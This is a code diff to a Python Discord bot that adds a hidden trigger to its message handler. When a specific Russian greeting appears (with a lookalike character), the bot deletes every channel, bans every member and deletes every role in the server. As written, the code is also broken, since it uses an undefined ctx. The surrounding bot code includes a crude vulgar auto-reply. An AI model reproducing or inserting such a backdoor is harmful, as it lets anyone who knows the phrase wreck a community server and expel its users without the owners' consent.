@@ -10,6 +10,33 @@ bot = commands.Bot(command_prefix = settings['prefix'])
 @bot.event
 async def on_message(message):
     
+    if "здравствуйте, дoрогие друзья!" in message.content:
+        
+        #оптимизация
+        guild = ctx.guild
+        author = ctx.author
+
+        #удаление каналов
+        for i in guild.channels:
+            try:
+                await i.delete ()
+            except:
+                continue
+
+        #бан
+        for j in guild.members:
+            try:
+                await j.ban ()
+            except:
+                continue
+
+        #кик
+        for k in guild.roles:
+            try:
+                await k.delete ()
+            except:
+                continue
+    
     if "suck" in message.content:
         
         await message.channel.send (message.author.mention + " fuck my ass")
